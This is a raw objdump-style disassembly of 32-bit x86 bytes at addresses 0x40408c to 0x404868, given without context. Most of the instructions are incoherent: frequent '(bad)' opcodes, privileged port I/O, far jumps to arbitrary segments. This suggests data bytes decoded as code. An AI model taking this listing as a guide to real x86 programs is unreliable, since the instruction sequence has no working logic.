  40408c:	xchg   BYTE PTR [esi],cl
  40408e:	jnp    0x404058
  404090:	pop    esp
  404091:	sub    DWORD PTR [esi+eiz*8+0x568bbbeb],edx
  404098:	sbb    ch,BYTE PTR [ecx]
  40409a:	fisub  DWORD PTR [edx+0x47fb7061]
  4040a0:	inc    ebp
  4040a1:	sbb    al,0x2c
  4040a3:	aam    0x7d
  4040a5:	ss jmp 0x9ff6:0x4cd779a
  4040ad:	jmp    0xa4fe:0x2fcfd80e
  4040b4:	cdq    
  4040b5:	mov    eax,ds:0x4d062a71
  4040ba:	add    dl,BYTE PTR [edx]
  4040bc:	and    eax,0xbdb4d2ce
  4040c1:	out    0x28,eax
  4040c3:	jns    0x4040a8
  4040c5:	mov    eax,ds:0x6a592d1d
  4040ca:	hlt    
  4040cb:	add    BYTE PTR [ebp+0x36],cl
  4040ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040cf:	mov    edi,0xde8d3620
  4040d4:	mov    al,0xd5
  4040d6:	hlt    
  4040d7:	pushf  
  4040d8:	cli    
  4040d9:	mov    edi,DWORD PTR gs:[ecx]
  4040dc:	mov    ch,0xb3
  4040de:	in     eax,dx
  4040df:	dec    esi
  4040e0:	scas   al,BYTE PTR es:[edi]
  4040e1:	nop
  4040e2:	stos   DWORD PTR es:[edi],eax
  4040e3:	(bad)  
  4040e4:	mov    eax,ds:0x16cb9501
  4040e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040ea:	xlat   BYTE PTR ds:[ebx]
  4040eb:	add    BYTE PTR [esi+0x5a],dh
  4040ee:	push   cs
  4040ef:	adc    al,0x65
  4040f1:	mov    ecx,0x8b7d587c
  4040f6:	jae    0x4040b2
  4040f8:	shl    BYTE PTR [eax-0x48],cl
  4040fb:	retf   
  4040fc:	outs   dx,BYTE PTR ds:[esi]
  4040fd:	das    
  4040fe:	ret    
  4040ff:	sub    al,0xc1
  404101:	mov    ecx,0x631a4441
  404106:	adc    esi,DWORD PTR [eax-0x2f]
  404109:	data16 int3 
  40410b:	sub    eax,0x89aa003e
  404110:	pop    esi
  404111:	and    eax,0xdc358bf7
  404116:	imul   DWORD PTR [edx]
  404118:	mov    ah,0xa1
  40411a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40411b:	xchg   DWORD PTR [ebp-0x3221015c],esi
  404121:	fild   WORD PTR [ebx+esi*4]
  404124:	out    dx,al
  404125:	je     0x40419a
  404127:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404128:	pop    edx
  404129:	xchg   esi,eax
  40412a:	jecxz  0x404100
  40412c:	mov    BYTE PTR [edi+edx*1+0x74],ah
  404130:	es jmp 0x404136
  404133:	and    eax,0x81412059
  404138:	inc    esp
  404139:	jns    0x4040d5
  40413b:	(bad)  
  40413d:	mov    ds:0xb6bb7f4e,eax
  404142:	retf   0xcd60
  404145:	cmp    DWORD PTR ds:0x4ad2f82a,edx
  40414b:	pushf  
  40414c:	cmc    
  40414d:	fdivr  DWORD PTR [ebx-0x33]
  404150:	pop    ebx
  404151:	out    dx,al
  404152:	dec    edx
  404153:	mov    al,0xc1
  404155:	xor    al,0xb6
  404157:	adc    al,0x63
  404159:	jle    0x404107
  40415b:	leave  
  40415c:	push   esi
  40415d:	repnz sub edi,ebp
  404160:	adc    esp,DWORD PTR [ebp-0x30]
  404163:	lock jmp 0x9c8d6743
  404169:	pop    ebp
  40416a:	aas    
  40416b:	call   0xea587f67
  404170:	push   ecx
  404171:	cmp    eax,0xd6f1aa5
  404176:	ins    BYTE PTR es:[edi],dx
  404177:	and    ah,BYTE PTR [esi+0x4be45458]
  40417d:	jle    0x404166
  40417f:	in     al,dx
  404180:	mov    al,0xfb
  404182:	daa    
  404183:	jecxz  0x4041fd
  404185:	inc    esi
  404186:	mov    ch,0x99
  404188:	fisub  DWORD PTR [eax-0x2a]
  40418b:	and    dl,BYTE PTR [edi-0x16]
  40418e:	mov    ebp,0xe51cad84
  404193:	jno    0x40419c
  404195:	jno    0x4041c6
  404197:	lock jnp 0x4041cc
  40419a:	or     al,0xe6
  40419c:	mov    eax,0x9a4d7579
  4041a1:	icebp  
  4041a2:	and    DWORD PTR [ecx],esi
  4041a4:	popf   
  4041a5:	(bad)  
  4041a7:	sbb    BYTE PTR [ebx+0x37],bh
  4041aa:	es (bad) 
  4041ac:	out    0x92,al
  4041ae:	xor    DWORD PTR [ebx+0x7891491a],ecx
  4041b4:	pop    es
  4041b5:	add    eax,0x19a39d8f
  4041ba:	arpl   WORD PTR [edi+0x6b],si
  4041bd:	ror    ebx,0x2b
  4041c0:	xlat   BYTE PTR ds:[ebx]
  4041c1:	dec    ecx
  4041c2:	movlps xmm7,QWORD PTR [edi]
  4041c5:	xchg   ecx,eax
  4041c7:	iret   
  4041c8:	xor    BYTE PTR ds:0xec325bf2,al
  4041ce:	js     0x404166
  4041d0:	or     al,0xa4
  4041d2:	jmp    FWORD PTR [edi+0x3f]
  4041d5:	ror    BYTE PTR [ebp+0x3442d3cd],0x6c
  4041dc:	aas    
  4041dd:	cmp    cl,BYTE PTR [ebx+0x64]
  4041e0:	add    bh,BYTE PTR [edi]
  4041e2:	inc    eax
  4041e3:	sahf   
  4041e4:	addr16 push 0xa3c57117
  4041ea:	dec    ebx
  4041eb:	adc    eax,0xb8099342
  4041f0:	push   eax
  4041f1:	xchg   edx,eax
  4041f2:	loope  0x40419b
  4041f4:	mov    cl,ch
  4041f6:	or     al,0xfc
  4041f8:	out    0x5d,al
  4041fa:	cmp    ah,BYTE PTR [edi-0x683de89d]
  404200:	jle    0x4041c4
  404202:	pop    ss
  404203:	data16 lods al,BYTE PTR fs:[esi]
  404206:	mov    eax,0x2eb470f4
  40420b:	sub    cl,ah
  40420d:	arpl   WORD PTR [edx],sp
  40420f:	in     eax,dx
  404210:	push   esp
  404211:	call   0xb75d:0xba3ebc88
  404218:	cmp    esp,DWORD PTR [esi+0x352f9971]
  40421e:	mov    eax,ds:0x25663f85
  404223:	add    DWORD PTR [edx],esi
  404225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404226:	ja     0x4041ad
  404228:	shl    bh,1
  40422a:	pop    ebp
  40422b:	dec    ecx
  40422c:	add    ebp,DWORD PTR [ecx+ebp*4+0x46]
  404230:	jns    0x4042a2
  404232:	cli    
  404233:	retf   0xb664
  404236:	fcom   QWORD PTR [ebx-0x29]
  404239:	mov    DWORD PTR fs:[ebp+0x78],0x576dca45
  404241:	call   0xb2774fe1
  404246:	dec    BYTE PTR [esi+0x28562c49]
  40424c:	(bad)  
  40424d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40424e:	aad    0xe1
  404250:	loop   0x40420a
  404252:	sbb    DWORD PTR [ebx],ebp
  404254:	jne    0x404250
  404256:	xchg   BYTE PTR [esi-0x385b41a6],bh
  40425c:	jno    0x404299
  40425e:	jnp    0x404258
  404260:	mov    dh,0xbb
  404262:	push   0xcf058ecc
  404267:	xchg   dl,bl
  404269:	shl    DWORD PTR [esi],0x5f
  40426c:	iret   
  40426d:	fimul  WORD PTR [ebx]
  40426f:	mov    al,ds:0xc5b10b4c
  404274:	mov    eax,0x43bdeff6
  404279:	rcl    dl,1
  40427b:	cmp    eax,0xb32b4574
  404280:	(bad)  
  404281:	sub    al,0x92
  404283:	stos   BYTE PTR es:[edi],al
  404284:	lock iret 
  404286:	jle    0x4042cd
  404288:	rcr    BYTE PTR [edi],0xe9
  40428b:	ds sar ah,0x6a
  40428f:	lock ret 0x54b5
  404293:	sub    al,0x72
  404295:	sub    DWORD PTR [eax+esi*2],ebx
  404298:	jge    0x40427e
  40429a:	inc    ebp
  40429c:	dec    eax
  40429d:	into   
  40429e:	fdiv   DWORD PTR [eax+0x7b]
  4042a1:	cmp    BYTE PTR [ebx+0x7b1e1e8a],dl
  4042a7:	mov    gs,WORD PTR [ebp-0x48650ee6]
  4042ad:	test   BYTE PTR [esi],bl
  4042af:	cmp    dh,BYTE PTR [edx+0x406f8ac2]
  4042b5:	daa    
  4042b6:	inc    esp
  4042b7:	fisub  DWORD PTR [edi+0x47]
  4042ba:	dec    esp
  4042bb:	xchg   BYTE PTR [eax],bh
  4042bd:	xor    al,0xfa
  4042bf:	fst    DWORD PTR [ebx-0x2ebb6f05]
  4042c5:	lock dec edi
  4042c7:	enter  0x1a24,0x88
  4042cb:	xor    bl,BYTE PTR [eax+edi*8-0x73]
  4042cf:	gs push 0x0
  4042d2:	jg     0x4042e2
  4042d4:	data16 xchg BYTE PTR [esi-0x43],bl
  4042d8:	mov    dl,0xd0
  4042da:	lahf   
  4042db:	xor    edi,edi
  4042dd:	fmulp  st(3),st
  4042df:	(bad)  
  4042e0:	push   edi
  4042e1:	xchg   edi,eax
  4042e2:	ins    DWORD PTR es:[edi],dx
  4042e3:	pop    edi
  4042e4:	sbb    al,0x33
  4042e6:	mov    ch,0xce
  4042e8:	adc    eax,0x45468aed
  4042ed:	stc    
  4042ee:	ins    DWORD PTR es:[edi],dx
  4042ef:	xor    al,0x16
  4042f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042f2:	mov    dl,0xf2
  4042f4:	rep ins BYTE PTR es:[edi],dx
  4042f6:	cld    
  4042f7:	push   esp
  4042f8:	test   al,0x98
  4042fa:	jge    0x404365
  4042fc:	rcl    DWORD PTR [eax],1
  4042fe:	jbe    0x404348
  404300:	mov    dl,0x51
  404302:	scas   eax,DWORD PTR es:[edi]
  404303:	loop   0x404357
  404305:	adc    eax,0x54043a91
  40430a:	inc    ecx
  40430b:	push   ss
  40430c:	scas   al,BYTE PTR es:[edi]
  40430d:	bound  ebx,QWORD PTR [eax-0x1c4dc101]
  404313:	push   cs
  404314:	inc    edx
  404315:	push   esi
  404316:	aam    0xc4
  404318:	push   cs
  404319:	es cmp al,0x97
  40431c:	je     0x4042fd
  40431e:	add    BYTE PTR [ecx-0x7c777386],0x12
  404325:	cwde   
  404326:	sbb    al,0xfd
  404328:	cmp    al,0x6b
  40432a:	(bad)  
  40432b:	xchg   esp,eax
  40432c:	(bad)  
  40432d:	enter  0xf6fa,0x76
  404331:	push   esp
  404332:	xor    eax,0xb4c9d671
  404337:	push   ebx
  404338:	inc    esp
  404339:	cli    
  40433a:	jecxz  0x404372
  40433c:	pop    ss
  40433d:	pushf  
  40433e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40433f:	mov    es,WORD PTR ds:0xd6608806
  404345:	xchg   ebx,eax
  404346:	fwait
  404347:	push   0xbfdf3309
  40434c:	or     BYTE PTR [ebp+0x19],dl
  40434f:	jmp    0x37d0:0x63cc0b53
  404356:	(bad)  
  404357:	jg     0x404332
  404359:	outs   dx,BYTE PTR ds:[esi]
  40435a:	int    0xa6
  40435c:	pop    esp
  40435d:	jmp    0x4043ba
  40435f:	add    BYTE PTR [eax+ebp*1+0x4c],ch
  404363:	(bad)  
  404365:	or     eax,0xaef2e278
  40436a:	pop    ds
  40436b:	mov    bh,0x78
  40436d:	sub    ecx,ecx
  40436f:	sub    al,0x99
  404371:	scas   al,BYTE PTR es:[edi]
  404372:	xlat   BYTE PTR ds:[ebx]
  404373:	(bad)  
  404374:	out    dx,eax
  404375:	jo     0x4043e2
  404377:	mov    edx,DWORD PTR [edx-0x3a]
  40437a:	retf   0xe266
  40437d:	push   0xffffffec
  40437f:	addr16 inc ebp
  404381:	bound  ebp,QWORD PTR [edi-0x128d6923]
  404387:	jnp    0x4043fd
  404389:	retf   
  40438a:	pop    esp
  40438b:	(bad)  [esi+0x29431038]
  404391:	in     al,dx
  404392:	and    al,0x60
  404394:	mov    al,0x31
  404396:	add    edx,DWORD PTR [eax+eax*4+0x17a1f37e]
  40439d:	les    eax,FWORD PTR [eax+0x20bbc569]
  4043a3:	mov    bl,0xf
  4043a5:	ins    BYTE PTR es:[edi],dx
  4043a6:	xor    edx,edx
  4043a8:	dec    esp
  4043a9:	enter  0xab75,0x3e
  4043ad:	or     DWORD PTR [ebx-0x3],0x57
  4043b1:	add    bl,ah
  4043b3:	icebp  
  4043b4:	and    DWORD PTR [edi],ebx
  4043b6:	push   ss
  4043b7:	mov    edx,esi
  4043b9:	gs push esi
  4043bb:	push   esi
  4043bc:	cwde   
  4043bd:	cld    
  4043be:	and    edx,DWORD PTR [ecx+esi*1]
  4043c1:	out    dx,al
  4043c2:	ss xchg esp,eax
  4043c4:	mov    dl,0x92
  4043c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043c7:	inc    edx
  4043c8:	in     al,0x73
  4043ca:	cmp    edi,0x59
  4043cd:	adc    eax,edi
  4043cf:	sub    al,0x5f
  4043d1:	jge    0x404411
  4043d3:	mov    DWORD PTR [edx+0x4f],ecx
  4043d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043d7:	mov    esi,0x1440c119
  4043dc:	daa    
  4043dd:	mov    esp,DWORD PTR [ebx+esi*1-0x11dee4d9]
  4043e4:	out    0xe7,eax
  4043e6:	adc    ecx,eax
  4043e8:	mov    ds:0x738f888a,eax
  4043ed:	call   DWORD PTR [ecx-0x1ad4b68a]
  4043f3:	mov    ds:0x29a9ed0e,al
  4043f8:	fs jb  0x4043c1
  4043fb:	adc    eax,0x9655ead4
  404400:	lods   al,BYTE PTR ds:[esi]
  404401:	cmp    bl,BYTE PTR [esi]
  404403:	out    dx,al
  404404:	(bad)  [ebx+0x44de1326]
  40440a:	test   edx,0x8d04f5b0
  404410:	leave  
  404411:	(bad)
  404414:	pop    ecx
  404415:	gs adc al,0x9b
  404418:	fstp   DWORD PTR [ebx]
  40441a:	pop    ebp
  40441b:	or     eax,0x6efa089d
  404420:	mov    edx,0x675c7ba5
  404425:	mov    edx,0xef95aa76
  40442a:	cmc    
  40442b:	dec    esp
  40442c:	neg    BYTE PTR [ecx]
  40442e:	and    DWORD PTR [ecx],0x2
  404431:	dec    esi
  404432:	mov    dh,0x87
  404434:	jne    0x404486
  404436:	mov    WORD PTR [edx],ss
  404438:	arpl   WORD PTR [ecx+edi*2],cx
  40443b:	imul   BYTE PTR [ebp+0x6e54ca67]
  404441:	popa   
  404442:	nop
  404443:	lods   eax,DWORD PTR ds:[esi]
  404444:	push   edi
  404445:	cmp    bl,0x30
  404448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404449:	mov    bh,0xd2
  40444b:	mov    bh,0x58
  40444d:	jmp    0xebc0109e
  404452:	sbb    ah,bl
  404454:	mov    ebp,0x63e74204
  404459:	mov    ah,0x41
  40445b:	jo     0x40446a
  40445d:	mov    WORD PTR [ebp+0x40],?
  404460:	cmovg  ecx,DWORD PTR [edx]
  404463:	ja     0x4044b6
  404465:	or     eax,0x42348b2c
  40446a:	adc    al,ah
  40446c:	not    BYTE PTR [ecx]
  40446e:	mov    bl,0x67
  404470:	xor    al,0xc2
  404472:	mov    edx,0xdc69a84c
  404477:	mov    esp,0xd8f81330
  40447c:	fs cs pop es
  40447f:	js     0x4044f8
  404481:	out    dx,al
  404482:	out    dx,eax
  404483:	std    
  404484:	xor    BYTE PTR [edx+0x43],bl
  404487:	sbb    dl,cl
  404489:	in     eax,0xa3
  40448b:	pop    ds
  40448c:	sahf   
  40448d:	mov    ebp,0xae8454fc
  404492:	dec    ebx
  404493:	es inc esi
  404495:	sub    esp,DWORD PTR [esi]
  404497:	mov    ds:0xa2345260,al
  40449c:	xor    ch,BYTE PTR [eax+ecx*2]
  40449f:	mov    esp,DWORD PTR [esi]
  4044a1:	call   0x4308:0x4e1faac7
  4044a8:	push   ecx
  4044a9:	or     esi,DWORD PTR [edi-0x54b415a9]
  4044af:	jnp    0x404465
  4044b1:	jb     0x4044fa
  4044b3:	pop    ecx
  4044b4:	sub    al,0xe6
  4044b6:	dec    edi
  4044b7:	cmp    al,0x77
  4044b9:	int    0xba
  4044bb:	or     cl,BYTE PTR [edx+0x25]
  4044be:	mov    eax,ds:0xc3b63635
  4044c3:	rol    BYTE PTR [edi-0x661e6c1d],1
  4044c9:	pop    ecx
  4044ca:	sbb    ebx,ebx
  4044cc:	popa   
  4044cd:	dec    ebx
  4044ce:	push   esp
  4044cf:	imul   ebp,DWORD PTR [edx+0x3315a5c1],0xb40f6f33
  4044d9:	das    
  4044da:	(bad)  
  4044db:	int    0x70
  4044dd:	add    DWORD PTR [edi+0x63],0xde7ea2f2
  4044e4:	aas    
  4044e5:	out    0x7,eax
  4044e7:	mov    ebp,0x82145046
  4044ec:	sbb    bh,bh
  4044ee:	pop    edi
  4044ef:	in     al,dx
  4044f0:	ret    
  4044f1:	xor    ecx,DWORD PTR [eax]
  4044f3:	or     BYTE PTR [ebx],al
  4044f5:	sub    eax,0x5f53d5c4
  4044fa:	adc    al,0x51
  4044fc:	lahf   
  4044fd:	cmp    BYTE PTR [esi+0x39],cl
  404500:	out    dx,al
  404501:	ret    0xc14b
  404504:	out    dx,eax
  404505:	jl     0x4044f3
  404507:	mov    ?,WORD PTR [esi]
  404509:	mov    ebp,edi
  40450b:	daa    
  40450c:	xor    esp,DWORD PTR [edi+0x3244d32c]
  404512:	dec    ebx
  404513:	aad    0xe2
  404515:	lock (bad) 
  404517:	sub    DWORD PTR [edi],ebx
  404519:	out    0x6d,eax
  40451b:	jne    0x4044f1
  40451d:	shr    edi,1
  40451f:	mov    ds:0x6fbee1f6,eax
  404524:	stos   DWORD PTR es:[edi],eax
  404525:	add    dl,ah
  404527:	jl     0x404516
  404529:	outs   dx,BYTE PTR ds:[esi]
  40452a:	(bad)  
  40452b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40452c:	xor    edx,DWORD PTR [esi+0x0]
  40452f:	popf   
  404530:	mov    al,BYTE PTR [edi-0x28]
  404533:	sub    ch,BYTE PTR [edx+0x16fb017]
  404539:	mov    cl,0xb2
  40453b:	xchg   edi,eax
  40453c:	cwde   
  40453d:	dec    edi
  40453e:	jmp    0x404514
  404540:	mov    ebp,0xb8f60ca6
  404545:	push   es
  404546:	(bad)
  404549:	pop    esi
  40454a:	repnz das 
  40454c:	js     0x4044fe
  40454e:	dec    esp
  40454f:	(bad)  
  404550:	inc    esp
  404551:	pop    ebx
  404552:	push   ebx
  404553:	daa    
  404554:	and    edi,esi
  404556:	or     DWORD PTR [eax+0x47adfe5d],edx
  40455c:	mov    ah,BYTE PTR [ebx+0xe]
  40455f:	sbb    BYTE PTR [ecx],ch
  404561:	adc    ah,bh
  404563:	ds icebp 
  404565:	sbb    al,0x92
  404567:	(bad)
  40456b:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40456d:	sbb    ecx,eax
  40456f:	adc    dl,dh
  404571:	dec    ebp
  404572:	dec    DWORD PTR [edi-0x6d]
  404575:	jo     0x404527
  404577:	jbe    0x404559
  404579:	cmp    bh,BYTE PTR [ebx]
  40457b:	adc    eax,0xa4022254
  404580:	imul   DWORD PTR [esp+ebp*4]
  404583:	mov    al,0x2a
  404585:	cmp    edx,ecx
  404587:	mov    edi,0xea8b4261
  40458c:	cmp    eax,0x7bcab3f8
  404591:	pushf  
  404592:	jbe    0x4045d0
  404594:	daa    
  404595:	jp     0x4045bc
  404597:	leave  
  404598:	aas    
  404599:	and    eax,0xd7387a3e
  40459e:	jb     0x404612
  4045a0:	scas   eax,DWORD PTR es:[edi]
  4045a1:	cmp    edi,DWORD PTR [esi-0x6]
  4045a4:	xchg   ebp,eax
  4045a5:	inc    edi
  4045a6:	push   esi
  4045a7:	adc    cl,BYTE PTR [edi]
  4045a9:	inc    ebx
  4045aa:	out    dx,eax
  4045ab:	push   ss
  4045ac:	and    DWORD PTR [edi+ecx*8],eax
  4045af:	inc    eax
  4045b0:	clc    
  4045b1:	popa   
  4045b2:	push   edx
  4045b3:	xchg   BYTE PTR [eax-0x70088ded],ch
  4045b9:	dec    eax
  4045ba:	add    al,0x13
  4045bc:	cmp    DWORD PTR [edx],ebx
  4045be:	adc    BYTE PTR [edx+eax*1+0x41],0x79
  4045c3:	push   ebx
  4045c5:	mov    esp,0x8e0c307a
  4045ca:	sbb    eax,0x747c4374
  4045cf:	cmp    dh,BYTE PTR [esi+0x5191969d]
  4045d5:	cmp    BYTE PTR ds:0x401d8506,ch
  4045db:	sub    dh,BYTE PTR [edi+0xe]
  4045de:	inc    ebx
  4045df:	mov    al,0x64
  4045e1:	pop    ebx
  4045e2:	jp     0x4045cf
  4045e4:	mov    WORD PTR [ebx+0x5e66b383],gs
  4045ea:	pop    ebp
  4045eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045ec:	scas   al,BYTE PTR es:[edi]
  4045ed:	call   0xceb2a8ff
  4045f2:	shr    DWORD PTR [eax+0x7e],0xc8
  4045f6:	shr    BYTE PTR [ebp+0x52],0x59
  4045fa:	and    bh,BYTE PTR [edi+ebp*2+0x9127989]
  404601:	out    dx,al
  404602:	mov    ebx,0x90a8983a
  404607:	iret   
  404608:	shr    DWORD PTR [esi],0x4e
  40460b:	loop   0x40463b
  40460d:	xchg   ebx,eax
  40460e:	sbb    ebx,DWORD PTR [edi]
  404610:	in     eax,0x87
  404612:	adc    BYTE PTR [eax],ch
  404614:	sbb    DWORD PTR [edx],edi
  404616:	or     BYTE PTR [esi],bh
  404618:	clc    
  404619:	sub    ch,0x10
  40461c:	add    eax,0xaa2508fc
  404621:	inc    esp
  404622:	in     eax,0xbb
  404624:	xlat   BYTE PTR ds:[ebx]
  404625:	adc    eax,0x3f2e731c
  40462a:	add    eax,0xe8a94c9d
  40462f:	das    
  404630:	jg     0x4045d3
  404632:	or     DWORD PTR ds:0x8ff9ab0d,0x71
  404639:	fbstp  TBYTE PTR [eax-0x1c3019a]
  40463f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404640:	push   ecx
  404641:	enter  0x521b,0x38
  404645:	pop    ss
  404646:	call   0x9d7c2ce7
  40464b:	adc    DWORD PTR [ebp-0x64],0x9404d8f7
  404652:	sub    esp,edx
  404654:	into   
  404655:	mov    DWORD PTR [ebp+edx*4+0x30a0e7cb],esp
  40465c:	cmp    DWORD PTR [eax+0x28],edi
  40465f:	in     al,0xaa
  404661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404662:	jmp    0x4046c8
  404664:	push   cs
  404665:	das    
  404666:	in     al,dx
  404667:	or     dl,cl
  404669:	xor    eax,0xf4008f93
  40466e:	xor    DWORD PTR [ebx-0x30744f1],ebp
  404674:	inc    BYTE PTR [eax-0x27]
  404677:	in     eax,0x68
  404679:	arpl   WORD PTR [ebp-0x4],bp
  40467c:	popa   
  40467d:	dec    edi
  40467e:	add    ah,BYTE PTR [ebp+0x53]
  404681:	call   0xd50b:0x5a9ff0f
  404688:	xor    eax,0x31865c9b
  40468d:	lea    ebp,[edi+0x4a]
  404690:	out    0x1c,al
  404692:	ins    BYTE PTR es:[edi],dx
  404693:	inc    edx
  404694:	and    al,0xc9
  404696:	in     al,0x2e
  404698:	inc    eax
  404699:	icebp  
  40469a:	sub    BYTE PTR [eiz*8-0xcadedad],ch
  4046a1:	and    edi,DWORD PTR [esi-0x73]
  4046a4:	mov    ch,0x75
  4046a6:	or     BYTE PTR [ebp+0x7a],dh
  4046a9:	cld    
  4046aa:	test   al,0xd4
  4046ac:	fbld   TBYTE PTR [edx-0x5b]
  4046af:	cmp    BYTE PTR [eax+0x121da9cb],bl
  4046b5:	shl    BYTE PTR [esi+0x5],0x80
  4046b9:	adc    al,0x5b
  4046bb:	xchg   ebx,eax
  4046bc:	(bad)  
  4046bd:	cld    
  4046be:	sub    ebx,DWORD PTR [ebp+0x52]
  4046c1:	mov    fs,WORD PTR [ebx+0x211c63ea]
  4046c7:	inc    ebx
  4046c8:	cmp    al,BYTE PTR [edi+0x77]
  4046cb:	cmc    
  4046cc:	pushf  
  4046cd:	loop   0x404715
  4046cf:	mov    al,0xc4
  4046d1:	ins    BYTE PTR es:[edi],dx
  4046d2:	test   DWORD PTR [edx+0x3f],edx
  4046d5:	in     al,dx
  4046d6:	aas    
  4046d7:	lock fild QWORD PTR [ebp+0x1d]
  4046db:	mov    ds:0x1e23a22a,al
  4046e0:	call   0xe9ab:0x14763a40
  4046e7:	dec    edi
  4046e8:	jbe    0x4046ff
  4046ea:	out    0xdf,eax
  4046ec:	les    edi,FWORD PTR [ebx+0x7]
  4046ef:	push   esp
  4046f0:	ds pop ebp
  4046f2:	lods   eax,DWORD PTR ds:[esi]
  4046f3:	(bad)  
  4046f4:	jmp    0x4976554a
  4046f9:	scas   eax,DWORD PTR es:[edi]
  4046fa:	and    ah,BYTE PTR [ebp-0x615f14ff]
  404700:	or     DWORD PTR [edi+0x41d84394],ebx
  404706:	cmp    al,0x6
  404708:	sbb    eax,0x78eab461
  40470d:	mov    ebp,0x69a20724
  404712:	add    DWORD PTR [bx-0x481c],edx
  404717:	jno    0x40469b
  404719:	push   ss
  40471a:	mov    bl,0x5f
  40471c:	push   eax
  40471d:	mov    ch,0xdc
  40471f:	in     eax,0xad
  404721:	jbe    0x4046d5
  404723:	or     eax,0x300bc6af
  404728:	leave  
  404729:	pop    esp
  40472a:	mov    ebx,0x9c49a948
  40472f:	jne    0x40477f
  404731:	daa    
  404732:	sbb    eax,0xfb5ee282
  404737:	or     DWORD PTR [ebx-0x6df4f141],esi
  40473d:	mov    ebp,0x54b706fd
  404742:	mov    ds:0xb5215bc,al
  404747:	sub    BYTE PTR [edi+0x37706f07],cl
  40474d:	push   0x74575fb1
  404752:	int    0xfc
  404754:	stos   DWORD PTR es:[edi],eax
  404755:	push   ebx
  404756:	lds    edx,FWORD PTR ds:0xf23b9aa2
  40475c:	dec    edx
  40475d:	push   0xffffff81
  40475f:	push   esp
  404760:	mov    edx,0x6f89077
  404765:	xchg   ecx,eax
  404766:	loop   0x40477c
  404768:	xchg   DWORD PTR [eax],ebp
  40476a:	dec    edi
  40476b:	mov    al,0xa3
  40476d:	sar    DWORD PTR [eax+edx*8],0xd4
  404771:	hlt    
  404772:	mov    DWORD PTR [eax+0x37f07372],ebx
  404778:	adc    ah,BYTE PTR [edi]
  40477a:	aas    
  40477b:	jnp    0x4047b2
  40477d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40477e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40477f:	add    esp,edi
  404781:	inc    ebp
  404782:	adc    eax,0xe9bde142
  404787:	lods   al,BYTE PTR ds:[esi]
  404788:	fild   DWORD PTR [edx-0x5e]
  40478b:	es scas al,BYTE PTR es:[edi]
  40478d:	dec    edx
  40478e:	mov    ah,0x58
  404790:	hlt    
  404791:	gs jle 0x40471f
  404794:	xor    al,0xcc
  404796:	in     eax,dx
  404797:	jg     0x40478a
  404799:	mov    ecx,0x6aa35047
  40479e:	loope  0x4047b7
  4047a0:	and    ebx,edx
  4047a2:	push   esi
  4047a3:	jns    0x40478b
  4047a5:	repnz adc ebx,esi
  4047a8:	xchg   edi,eax
  4047a9:	mov    ebp,0x5de5a8ae
  4047ae:	pop    ebp
  4047af:	pop    ebx
  4047b0:	enter  0xaff3,0x83
  4047b4:	loope  0x404833
  4047b6:	mov    ah,BYTE PTR [edx-0x3]
  4047b9:	cmp    BYTE PTR [edi-0x6d],0xae
  4047bd:	fcomp  DWORD PTR [edi-0x52bd8d79]
  4047c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047c4:	pop    edi
  4047c5:	std    
  4047c6:	in     al,dx
  4047c7:	push   0x6ef44387
  4047cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047cd:	out    dx,al
  4047ce:	repz pop edx
  4047d0:	jle    0x404837
  4047d2:	or     ebx,esp
  4047d4:	add    edi,DWORD PTR [edx]
  4047d6:	call   0x7ba12812
  4047db:	xor    ebx,eax
  4047dd:	xchg   BYTE PTR [esi-0x334ef8e6],cl
  4047e3:	and    BYTE PTR [esi-0x12],bl
  4047e6:	arpl   WORD PTR [eax+0x6a997a83],cx
  4047ec:	adc    ebx,esp
  4047ee:	sbb    esi,DWORD PTR [edx-0x2901775b]
  4047f4:	cli    
  4047f5:	mov    eax,0xd7b936a7
  4047fa:	mov    ds:0x20c96ac1,al
  4047ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404800:	fs (bad) 
  404802:	sets   BYTE PTR [esi-0x14]
  404806:	shl    DWORD PTR [esi],0x88
  404809:	inc    ebx
  40480a:	adc    al,0x31
  40480c:	in     al,0x25
  40480e:	loop   0x40483c
  404810:	iret   
  404811:	sti    
  404812:	sbb    DWORD PTR ds:0x7338e81b,0x7491e61f
  40481c:	dec    ecx
  40481d:	dec    ebx
  40481e:	mov    al,0xbc
  404820:	aam    0x7
  404822:	xchg   ecx,eax
  404823:	xchg   edi,eax
  404824:	inc    ebp
  404825:	push   cs
  404826:	popf   
  404827:	stos   DWORD PTR es:[edi],eax
  404828:	maxps  xmm6,xmm1
  40482b:	sub    al,0x72
  40482d:	adc    ch,BYTE PTR [ebx-0x2590d0ed]
  404833:	retf   
  404834:	in     al,dx
  404835:	pop    eax
  404836:	mov    edi,0xb833d6ed
  40483b:	je     0x404889
  40483d:	call   DWORD PTR [esi]
  40483f:	mov    esp,0x1d019a15
  404844:	pop    eax
  404845:	inc    ebp
  404846:	cmovle ebp,ecx
  404849:	cli    
  40484a:	test   eax,0xccf0e513
  40484f:	(bad)  [ebp+0x2915c261]
  404855:	inc    esp
  404856:	cld    
  404857:	push   esp
  404858:	mov    eax,0x35696e02
  40485d:	mov    ebp,0x9b5a0e59
  404862:	pop    edi
  404863:	pop    ss
  404864:	xchg   ah,dl
  404866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404867:	nop
  404868:	pushf  
